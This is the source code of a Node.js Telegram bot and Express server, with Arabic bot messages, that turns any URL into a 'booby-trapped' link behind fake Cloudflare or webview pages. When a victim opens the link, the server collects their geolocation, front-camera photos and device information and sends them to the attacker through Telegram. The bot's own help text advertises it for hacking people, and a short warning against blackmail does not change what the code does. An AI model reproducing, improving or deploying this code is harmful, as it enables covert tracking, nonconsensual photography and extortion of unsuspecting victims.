const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], { polling: true });
var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL = "https://instgrem-com.gdhghghdg.repl.co";
//TOGGLE for Shorters
var use1pt = false;


app.get("/w/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }

  if (req.params.path != null) {
    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  }
  else {
    res.redirect("https://t.me/th30neand0nly0ne");
  }



});

app.get("/c/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }


  if (req.params.path != null) {
    res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  }
  else {
    res.redirect("https://t.me/th30neand0nly0ne");
  }



});



bot.on('message', async (msg) => {
  const chatId = msg.chat.id;



  if (msg?.reply_to_message?.text == "🌐 ارسل الرابط الخاص بك\nمثال على الرابط : https://www.google.com") {
    createLink(chatId, msg.text);
  }

  if (msg.text == "/start") {
    var m = {
      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "صنع رابط", callback_data: "crenew" }]] })
    };

    bot.sendMessage(chatId, `اهلا ${msg.chat.first_name} ! , \nتستطيع استخدام هذا البوت باختراق الناس بواسطة رابط بسيط.\nيستطيع جلب معلومات مثل صورة من الكام الاماميه 
و الموقع و معلومات الجهاز
المطور : @Saed_313_1
في حال استخدام البوت في الابتزاز و التخريب سيتم محاسبتك و حظرك و تسليم معلوماتك الى الامن الوطني.`, m);
  }
  else if (msg.text == "/create") {
    createNew(chatId);
  }
  else if (msg.text == "/help") {
    bot.sendMessage(chatId, ` هذا البوت يسمح لك باختراق الناس بواسطة رابط بسيط عند دخول الضحيه للرابط ستصلك من البوت معلومات مثل الموقع و الكام الامامية و معلومات الجهاز

ملاحظة : في حال استخدام البوت بالابتزاز او التخريب سيتم محاسبتك و حظرك و تسليم معلوماتك الى الامن الوطني

مطور البوت : @iraqsfather
`);
  }


});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});
bot.on('polling_error', (error) => {
  //console.log(error.code);
});






async function createLink(cid, msg) {

  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {

    var url = cid.toString(36) + '/' + btoa(msg);
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "اضغط لصنع رابط اخر", callback_data: "crenew" }]]
      })
    };

    var cUrl = `${hostURL}/c/${url} `;
    var wUrl = `${hostURL}/w/${url} `;

    bot.sendChatAction(cid, "typing");
    if (use1pt) {
      var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
      var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

      var f = "", g = "";

      for (var c in x) {
        f += x[c] + "\n";
      }

      for (var c in y) {
        g += y[c] + "\n";
      }

      bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n Dev : Marvin | @Iraqsfather`, m);
    }
    else {

      bot.sendMessage(cid, `تم صناعة الرابط الملغم بنجاح.\nالرابط الاصلي : ${msg}\n\nفي حال استخدام البوت بشكل خاطئ ستم محاسبتك \n\n🌐 الرابط الخاص بك\n${cUrl}\n\nDev : Marvin | @iraqsfather`, m);
    }
  }
  else {
    bot.sendMessage(cid, `⚠️ ادخل رابط صالح , يحتوي على http او https.`);
    createNew(cid);

  }
}


function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(cid, "🌐 ارسل الرابط الخاص بك\nمثال على الرابط : https://www.google.com", mk);
}





app.get("/", (req, res) => {
  var ip;
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
  res.json({ "Tele": "@iraqsfather" });


});


app.post("/location", (req, res) => {


  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {

    bot.sendLocation(parseInt(uid, 36), lat, lon);

    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);

    res.send("Done");
  }
});


app.post("/", (req, res) => {

  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) {


    data = data.replaceAll("<br>", "\n");

    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });


    res.send("Done");
  }
});


app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;

  if (uid != null && img != null) {

    var buffer = Buffer.from(img, 'base64');

    var info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };


    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    } catch (error) {
      console.log(error);
    }


    res.send("Done");

  }

});



app.listen(5000, () => {
  console.log("Marvin's Bot is running on port 5000 !");
});